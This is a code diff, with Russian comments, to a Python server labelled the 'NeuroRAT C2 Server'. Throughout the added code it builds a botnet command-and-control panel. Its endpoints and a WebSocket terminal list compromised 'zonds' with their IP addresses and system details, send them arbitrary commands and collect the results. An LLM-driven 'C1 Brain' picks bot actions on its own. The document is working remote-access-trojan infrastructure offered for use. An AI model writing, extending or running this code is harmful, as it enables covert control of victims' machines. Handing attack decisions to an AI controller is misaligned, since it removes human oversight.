@@ -1047,7 +1047,7 @@ async def chat_with_agent(agent_id: str, request: Request):
         actions_output = []
         for cmd in thinking_result.get("actions", []):
             res = execute_command(cmd)
-            actions_output.append(f"$ {cmd}\n{res['output']}{'\nОшибка: ' + res['error'] if res['error'] else ''}")
+            actions_output.append("$ " + cmd + "\n" + res['output'] + ("Ошибка: " + res['error'] if res['error'] else ""))
         # Формируем chain-of-thought для UI
         chain_of_thought = {
             "sections": thinking_result.get("sections", {}),
@@ -1364,10 +1364,13 @@ async def react_chat_redirect():
     return RedirectResponse(url="/dashboard")
 
 if __name__ == "__main__":
-    # Обработка аргументов командной строки
-    parser = argparse.ArgumentParser(description="NeuroRAT C2 Server")
-    parser.add_argument("--builder-only", action="store_true", help="Запустить только режим билдера без полного сервера")
+    import argparse
+    
+    DEFAULT_PORT = 8080
+    
+    parser = argparse.ArgumentParser(description="NeuroRAT API Server")
     parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Порт для запуска сервера (по умолчанию: {DEFAULT_PORT})")
+    parser.add_argument("--builder-only", action="store_true", help="Запустить только режим билдера без полного сервера")
     args = parser.parse_args()
     
     # Обновляем порт, если указан в аргументах
@@ -2061,3 +2064,691 @@ async def chat_history(agent_id: str, search: str = None, sender: str = None, ty
         buf = io.BytesIO(json.dumps(history, ensure_ascii=False, indent=2).encode())
         return StreamingResponse(buf, media_type="application/json", headers={"Content-Disposition": f"attachment; filename=chat_{agent_id}.json"})
     return history
+
+# Импортируем модули для работы с C1 и зондами
+from botnet_controller import BotnetController, ZondConnectionStatus, ZondInfo
+from zond_protocol import TaskPriority, TaskStatus
+try:
+    # Импортируем модуль c1_brain, если он существует
+    from c1_brain import C1Brain, ThinkingMode
+    HAS_C1_BRAIN = True
+except ImportError:
+    HAS_C1_BRAIN = False
+    logger.warning("C1 Brain не обнаружен, автономное управление зондами будет недоступно")
+
+# Глобальные экземпляры для контроллера C1 и мозга C1
+c1_controller = None
+c1_brain = None
+
+# Инициализация контроллера C1 и его мозга
+def init_c1_controller():
+    global c1_controller, c1_brain
+    
+    # Получаем настройки из окружения или используем значения по умолчанию
+    server_id = os.getenv('C1_SERVER_ID', 'c1_server')
+    secret_key = os.getenv('C1_SECRET_KEY', 'shared_secret_key')
+    encryption_key = os.getenv('C1_ENCRYPTION_KEY', 'encryption_key_example')
+    listen_port = int(os.getenv('C1_LISTEN_PORT', '8443'))
+    storage_file = os.getenv('C1_STORAGE_FILE', 'zonds_storage.json')
+    
+    # Создаем контроллер
+    c1_controller = BotnetController(
+        server_id=server_id,
+        secret_key=secret_key,
+        encryption_key=encryption_key,
+        listen_port=listen_port,
+        storage_file=storage_file
+    )
+    
+    # Инициализируем мозг C1, если доступен
+    if HAS_C1_BRAIN:
+        thinking_interval = int(os.getenv('C1_THINKING_INTERVAL', '60'))
+        thinking_mode_str = os.getenv('C1_THINKING_MODE', 'defensive').upper()
+        
+        # Определяем режим мышления
+        try:
+            thinking_mode = ThinkingMode[thinking_mode_str]
+        except KeyError:
+            thinking_mode = ThinkingMode.DEFENSIVE
+            logger.warning(f"Неизвестный режим мышления: {thinking_mode_str}, используется DEFENSIVE")
+        
+        # Настройки LLM
+        llm_provider = os.getenv('C1_LLM_PROVIDER', 'api')
+        llm_config = {
+            "api_url": os.getenv('C1_LLM_API_URL', 'http://localhost:8080/api/agent/reasoning'),
+            "api_key": os.getenv('C1_LLM_API_KEY', '')
+        }
+        
+        # Создаем мозг C1
+        c1_brain = C1Brain(
+            controller=c1_controller,
+            thinking_interval=thinking_interval,
+            llm_provider=llm_provider,
+            llm_config=llm_config,
+            thinking_mode=thinking_mode
+        )
+        
+        # Устанавливаем колбэк для логирования действий мозга
+        c1_brain.set_log_callback(lambda action_type, data: record_event(
+            event_type=f"c1_brain_{action_type}",
+            agent_id="c1_server",
+            details=json.dumps(data)
+        ))
+        
+        logger.info(f"C1 Brain инициализирован в режиме {thinking_mode.value}")
+    
+    # Запускаем контроллер
+    c1_controller.start()
+    
+    # Запускаем мозг C1, если он доступен
+    if c1_brain:
+        c1_brain.start()
+    
+    logger.info(f"Контроллер C1 (server_id: {server_id}) успешно инициализирован")
+    return c1_controller
+
+# Запуск контроллера C1 при старте сервера
+if __name__ == "__main__":
+    # ... existing code ...
+    
+    # Инициализируем контроллер C1
+    c1_controller = init_c1_controller()
+    
+    # ... existing code ...
+
+# Страница C1 с панелью управления зондами
+@app.get("/c1", response_class=HTMLResponse)
+async def c1_dashboard(request: Request):
+    """Панель управления зондами C1"""
+    return templates.TemplateResponse("c1_dashboard.html", {
+        "request": request,
+        "title": "C1 Dashboard",
+        "server_id": c1_controller.server_id if c1_controller else "Не инициализирован"
+    })
+
+# API для работы с зондами
+@app.get("/api/c1/zonds")
+async def api_c1_zonds():
+    """Получение списка зондов"""
+    if not c1_controller:
+        return {"error": "C1 контроллер не инициализирован"}
+    
+    # Получаем информацию о зондах
+    zonds = {}
+    for zond_id, zond_info in c1_controller.get_all_zonds().items():
+        zonds[zond_id] = {
+            "zond_id": zond_id,
+            "status": zond_info.status.value,
+            "system_info": zond_info.system_info,
+            "capabilities": zond_info.capabilities,
+            "ip_address": zond_info.ip_address,
+            "last_seen": zond_info.last_seen,
+            "tasks_count": len(zond_info.tasks),
+            "online": zond_info.status == ZondConnectionStatus.ONLINE
+        }
+    
+    return {
+        "server_id": c1_controller.server_id,
+        "zonds": zonds,
+        "count": len(zonds),
+        "online_count": sum(1 for z in zonds.values() if z["online"])
+    }
+
+@app.get("/api/c1/zond/{zond_id}")
+async def api_c1_zond(zond_id: str):
+    """Получение информации о конкретном зонде"""
+    if not c1_controller:
+        return {"error": "C1 контроллер не инициализирован"}
+    
+    # Получаем информацию о зонде
+    zond_info = c1_controller.get_zond(zond_id)
+    if not zond_info:
+        raise HTTPException(status_code=404, detail=f"Зонд {zond_id} не найден")
+    
+    # Готовим информацию о задачах
+    tasks = []
+    for task in zond_info.tasks:
+        tasks.append({
+            "task_id": task.task_id,
+            "command": task.command,
+            "parameters": task.parameters,
+            "status": task.status.value,
+            "priority": task.priority.value,
+            "created_at": task.created_at,
+            "completed_at": task.completed_at,
+            "result": task.result
+        })
+    
+    return {
+        "zond_id": zond_id,
+        "status": zond_info.status.value,
+        "system_info": zond_info.system_info,
+        "capabilities": zond_info.capabilities,
+        "ip_address": zond_info.ip_address,
+        "last_seen": zond_info.last_seen,
+        "tasks": tasks,
+        "online": zond_info.status == ZondConnectionStatus.ONLINE
+    }
+
+@app.post("/api/c1/zond/{zond_id}/command")
+async def api_c1_zond_command(zond_id: str, command: dict = Body(...)):
+    """Отправка команды зонду"""
+    if not c1_controller:
+        return {"error": "C1 контроллер не инициализирован"}
+    
+    # Проверяем наличие зонда
+    zond_info = c1_controller.get_zond(zond_id)
+    if not zond_info:
+        raise HTTPException(status_code=404, detail=f"Зонд {zond_id} не найден")
+    
+    # Проверяем статус зонда
+    if zond_info.status != ZondConnectionStatus.ONLINE:
+        raise HTTPException(status_code=400, detail=f"Зонд {zond_id} не в сети (статус: {zond_info.status.value})")
+    
+    # Получаем параметры команды
+    cmd = command.get("command", "")
+    parameters = command.get("parameters", {})
+    priority_str = command.get("priority", "normal").upper()
+    
+    # Проверяем команду
+    if not cmd:
+        raise HTTPException(status_code=400, detail="Не указана команда")
+    
+    # Определяем приоритет
+    try:
+        priority = TaskPriority[priority_str]
+    except KeyError:
+        priority = TaskPriority.NORMAL
+    
+    # Отправляем команду
+    task = c1_controller.send_command(
+        zond_id=zond_id,
+        command=cmd,
+        parameters=parameters,
+        priority=priority
+    )
+    
+    if not task:
+        raise HTTPException(status_code=500, detail=f"Не удалось отправить команду {cmd} зонду {zond_id}")
+    
+    # Логируем действие
+    record_event(
+        event_type="c1_command_sent",
+        agent_id=zond_id,
+        details=f"Команда: {cmd}, Параметры: {parameters}"
+    )
+    
+    return {
+        "success": True,
+        "task_id": task.task_id,
+        "command": cmd,
+        "parameters": parameters,
+        "priority": priority.value,
+        "timestamp": time.time()
+    }
+
+@app.get("/api/c1/zond/{zond_id}/task/{task_id}")
+async def api_c1_zond_task(zond_id: str, task_id: str):
+    """Получение информации о задаче зонда"""
+    if not c1_controller:
+        return {"error": "C1 контроллер не инициализирован"}
+    
+    # Проверяем наличие зонда
+    zond_info = c1_controller.get_zond(zond_id)
+    if not zond_info:
+        raise HTTPException(status_code=404, detail=f"Зонд {zond_id} не найден")
+    
+    # Ищем задачу
+    task = None
+    for t in zond_info.tasks:
+        if t.task_id == task_id:
+            task = t
+            break
+    
+    if not task:
+        raise HTTPException(status_code=404, detail=f"Задача {task_id} не найдена для зонда {zond_id}")
+    
+    return {
+        "task_id": task.task_id,
+        "zond_id": zond_id,
+        "command": task.command,
+        "parameters": task.parameters,
+        "status": task.status.value,
+        "priority": task.priority.value,
+        "created_at": task.created_at,
+        "completed_at": task.completed_at,
+        "result": task.result
+    }
+
+@app.delete("/api/c1/zond/{zond_id}")
+async def api_c1_zond_delete(zond_id: str):
+    """Удаление зонда"""
+    if not c1_controller:
+        return {"error": "C1 контроллер не инициализирован"}
+    
+    # Удаляем зонд
+    result = c1_controller.remove_zond(zond_id)
+    
+    if not result:
+        raise HTTPException(status_code=404, detail=f"Зонд {zond_id} не найден")
+    
+    # Логируем действие
+    record_event(
+        event_type="c1_zond_deleted",
+        agent_id=zond_id,
+        details=f"Зонд {zond_id} удален"
+    )
+    
+    return {"success": True, "zond_id": zond_id}
+
+# API для работы с мозгом C1
+@app.get("/api/c1/brain/status")
+async def api_c1_brain_status():
+    """Получение статуса мозга C1"""
+    if not c1_brain:
+        return {"error": "C1 Brain не инициализирован"}
+    
+    return {
+        "active": c1_brain.running,
+        "thinking_mode": c1_brain.thinking_mode.value,
+        "thinking_count": c1_brain.thinking_count,
+        "last_thinking_time": c1_brain.last_thinking_time,
+        "action_history_count": len(c1_brain.action_history)
+    }
+
+@app.post("/api/c1/brain/think")
+async def api_c1_brain_think():
+    """Запуск одного цикла мышления"""
+    if not c1_brain:
+        return {"error": "C1 Brain не инициализирован"}
+    
+    # Запускаем один цикл мышления
+    thinking_result = c1_brain.think_once()
+    
+    # Логируем действие
+    record_event(
+        event_type="c1_brain_thinking",
+        agent_id="c1_server",
+        details=f"Запущен цикл мышления #{c1_brain.thinking_count}"
+    )
+    
+    return {
+        "success": thinking_result.get("success", False),
+        "sections": thinking_result.get("sections", {}),
+        "actions": thinking_result.get("actions", []),
+        "conclusion": thinking_result.get("conclusion", ""),
+        "thinking_count": c1_brain.thinking_count
+    }
+
+@app.post("/api/c1/brain/mode")
+async def api_c1_brain_mode(mode: dict = Body(...)):
+    """Изменение режима мышления"""
+    if not c1_brain:
+        return {"error": "C1 Brain не инициализирован"}
+    
+    # Получаем новый режим
+    mode_str = mode.get("mode", "").upper()
+    
+    # Проверяем режим
+    try:
+        thinking_mode = ThinkingMode[mode_str]
+    except KeyError:
+        raise HTTPException(status_code=400, detail=f"Неизвестный режим мышления: {mode_str}")
+    
+    # Устанавливаем новый режим
+    c1_brain.set_thinking_mode(thinking_mode)
+    
+    # Логируем действие
+    record_event(
+        event_type="c1_brain_mode_changed",
+        agent_id="c1_server",
+        details=f"Режим мышления изменен на {thinking_mode.value}"
+    )
+    
+    return {
+        "success": True,
+        "mode": thinking_mode.value,
+        "previous_mode": c1_brain.thinking_mode.value
+    }
+
+@app.post("/api/c1/brain/toggle")
+async def api_c1_brain_toggle(state: dict = Body(...)):
+    """Включение/выключение мозга C1"""
+    if not c1_brain:
+        return {"error": "C1 Brain не инициализирован"}
+    
+    # Получаем новое состояние
+    active = state.get("active", True)
+    
+    # Включаем или выключаем мозг
+    if active and not c1_brain.running:
+        c1_brain.start()
+        status = "started"
+    elif not active and c1_brain.running:
+        c1_brain.stop()
+        status = "stopped"
+    else:
+        status = "unchanged"
+    
+    # Логируем действие
+    if status != "unchanged":
+        record_event(
+            event_type="c1_brain_toggled",
+            agent_id="c1_server",
+            details=f"C1 Brain {status}"
+        )
+    
+    return {
+        "success": True,
+        "active": c1_brain.running,
+        "status": status
+    }
+
+@app.get("/api/c1/brain/history")
+async def api_c1_brain_history(limit: int = 10):
+    """Получение истории действий мозга C1"""
+    if not c1_brain:
+        return {"error": "C1 Brain не инициализирован"}
+    
+    # Ограничиваем количество записей
+    limit = max(1, min(100, limit))
+    
+    # Получаем последние записи
+    history = c1_brain.action_history[-limit:]
+    
+    return {
+        "count": len(history),
+        "total_count": len(c1_brain.action_history),
+        "history": history
+    }
+
+# Терминал для работы с зондами через WebSocket
+@app.websocket("/api/c1/terminal/ws")
+async def c1_terminal_websocket(websocket: WebSocket):
+    """WebSocket терминал для работы с зондами"""
+    await websocket.accept()
+    
+    # Генерируем уникальный идентификатор сессии
+    session_id = str(uuid.uuid4())
+    logger.info(f"Новая C1 терминальная сессия подключена: {session_id}")
+    
+    # История команд и результатов
+    command_history = []
+    
+    try:
+        # Отправляем приветственное сообщение
+        welcome_message = {
+            "type": "system",
+            "content": f"Терминал C1 подключен (session_id: {session_id})"
+        }
+        await websocket.send_json(welcome_message)
+        
+        # Основной цикл обработки сообщений
+        while True:
+            # Ожидаем сообщение от клиента
+            message = await websocket.receive_text()
+            
+            # Обрабатываем JSON-сообщение
+            try:
+                data = json.loads(message)
+                
+                # Команда для зонда
+                if data.get("type") == "command":
+                    zond_id = data.get("zond_id", "")
+                    command = data.get("command", "")
+                    parameters = data.get("parameters", {})
+                    
+                    # Проверяем наличие зонда и команды
+                    if not zond_id:
+                        response = {
+                            "type": "error",
+                            "content": "Не указан zond_id"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    if not command:
+                        response = {
+                            "type": "error",
+                            "content": "Не указана команда"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    # Проверяем существование зонда
+                    if not c1_controller:
+                        response = {
+                            "type": "error",
+                            "content": "C1 контроллер не инициализирован"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    zond_info = c1_controller.get_zond(zond_id)
+                    if not zond_info:
+                        response = {
+                            "type": "error",
+                            "content": f"Зонд {zond_id} не найден"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    # Проверяем статус зонда
+                    if zond_info.status != ZondConnectionStatus.ONLINE:
+                        response = {
+                            "type": "error",
+                            "content": f"Зонд {zond_id} не в сети (статус: {zond_info.status.value})"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    # Отправляем команду
+                    task = c1_controller.send_command(
+                        zond_id=zond_id,
+                        command=command,
+                        parameters=parameters,
+                        priority=TaskPriority.NORMAL
+                    )
+                    
+                    if not task:
+                        response = {
+                            "type": "error",
+                            "content": f"Не удалось отправить команду {command} зонду {zond_id}"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    # Сохраняем команду в историю
+                    command_entry = {
+                        "timestamp": time.time(),
+                        "zond_id": zond_id,
+                        "command": command,
+                        "parameters": parameters,
+                        "task_id": task.task_id
+                    }
+                    command_history.append(command_entry)
+                    
+                    # Отправляем подтверждение
+                    response = {
+                        "type": "command_sent",
+                        "zond_id": zond_id,
+                        "command": command,
+                        "parameters": parameters,
+                        "task_id": task.task_id
+                    }
+                    await websocket.send_json(response)
+                    
+                    # Логируем действие
+                    record_event(
+                        event_type="c1_terminal_command",
+                        agent_id=zond_id,
+                        details=f"Команда: {command}, Параметры: {parameters}"
+                    )
+                    
+                    # Ожидаем результата выполнения команды
+                    # Это упрощенная реализация, в реальности нужен механизм для отслеживания результатов
+                    # без блокировки основного потока
+                    max_wait_time = 30  # Максимальное время ожидания в секундах
+                    wait_interval = 0.5  # Интервал проверки
+                    
+                    start_time = time.time()
+                    while time.time() - start_time < max_wait_time:
+                        # Получаем актуальную информацию о задаче
+                        current_zond = c1_controller.get_zond(zond_id)
+                        if not current_zond:
+                            break
+                        
+                        # Ищем задачу
+                        current_task = None
+                        for t in current_zond.tasks:
+                            if t.task_id == task.task_id:
+                                current_task = t
+                                break
+                        
+                        if current_task and current_task.status in [TaskStatus.COMPLETED, TaskStatus.FAILED]:
+                            # Задача завершена, отправляем результат
+                            result_response = {
+                                "type": "command_result",
+                                "zond_id": zond_id,
+                                "command": command,
+                                "task_id": task.task_id,
+                                "status": current_task.status.value,
+                                "result": current_task.result
+                            }
+                            await websocket.send_json(result_response)
+                            break
+                        
+                        # Ждем и проверяем снова
+                        await asyncio.sleep(wait_interval)
+                
+                # Запрос состояния зонда
+                elif data.get("type") == "zond_status":
+                    zond_id = data.get("zond_id", "")
+                    
+                    if not zond_id:
+                        response = {
+                            "type": "error",
+                            "content": "Не указан zond_id"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    # Проверяем существование зонда
+                    if not c1_controller:
+                        response = {
+                            "type": "error",
+                            "content": "C1 контроллер не инициализирован"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    zond_info = c1_controller.get_zond(zond_id)
+                    if not zond_info:
+                        response = {
+                            "type": "error",
+                            "content": f"Зонд {zond_id} не найден"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    # Отправляем информацию о зонде
+                    response = {
+                        "type": "zond_status",
+                        "zond_id": zond_id,
+                        "status": zond_info.status.value,
+                        "system_info": zond_info.system_info,
+                        "capabilities": zond_info.capabilities,
+                        "ip_address": zond_info.ip_address,
+                        "last_seen": zond_info.last_seen,
+                        "tasks_count": len(zond_info.tasks)
+                    }
+                    await websocket.send_json(response)
+                
+                # Запрос списка зондов
+                elif data.get("type") == "list_zonds":
+                    if not c1_controller:
+                        response = {
+                            "type": "error",
+                            "content": "C1 контроллер не инициализирован"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    # Получаем информацию о зондах
+                    zonds = []
+                    for zond_id, zond_info in c1_controller.get_all_zonds().items():
+                        zonds.append({
+                            "zond_id": zond_id,
+                            "status": zond_info.status.value,
+                            "system_info": zond_info.system_info,
+                            "ip_address": zond_info.ip_address,
+                            "last_seen": zond_info.last_seen,
+                            "online": zond_info.status == ZondConnectionStatus.ONLINE
+                        })
+                    
+                    # Отправляем список зондов
+                    response = {
+                        "type": "zond_list",
+                        "zonds": zonds,
+                        "count": len(zonds),
+                        "online_count": sum(1 for z in zonds if z["online"])
+                    }
+                    await websocket.send_json(response)
+                
+                # Запрос на выполнение мышления
+                elif data.get("type") == "brain_think":
+                    if not c1_brain:
+                        response = {
+                            "type": "error",
+                            "content": "C1 Brain не инициализирован"
+                        }
+                        await websocket.send_json(response)
+                        continue
+                    
+                    # Запускаем один цикл мышления
+                    thinking_result = c1_brain.think_once()
+                    
+                    # Отправляем результат
+                    response = {
+                        "type": "brain_thinking_result",
+                        "success": thinking_result.get("success", False),
+                        "sections": thinking_result.get("sections", {}),
+                        "actions": thinking_result.get("actions", []),
+                        "conclusion": thinking_result.get("conclusion", ""),
+                        "thinking_count": c1_brain.thinking_count
+                    }
+                    await websocket.send_json(response)
+                
+                # Неизвестный тип сообщения
+                else:
+                    response = {
+                        "type": "error",
+                        "content": f"Неизвестный тип сообщения: {data.get('type')}"
+                    }
+                    await websocket.send_json(response)
+            
+            except json.JSONDecodeError:
+                # Если сообщение не JSON, отправляем ошибку
+                response = {
+                    "type": "error",
+                    "content": "Неверный формат сообщения, ожидается JSON"
+                }
+                await websocket.send_json(response)
+            
+            except Exception as e:
+                # Общая ошибка
+                response = {
+                    "type": "error",
+                    "content": f"Ошибка при обработке сообщения: {str(e)}"
+                }
+                await websocket.send_json(response)
+    
+    except WebSocketDisconnect:
+        logger.info(f"C1 терминальная сессия отключена: {session_id}")
+    
+    except Exception as e:
+        logger.error(f"Ошибка в C1 терминальной сессии {session_id}: {str(e)}")
+    
+    finally:
+        # Выполняем очистку ресурсов
+        logger.info(f"C1 терминальная сессия {session_id} очищена")
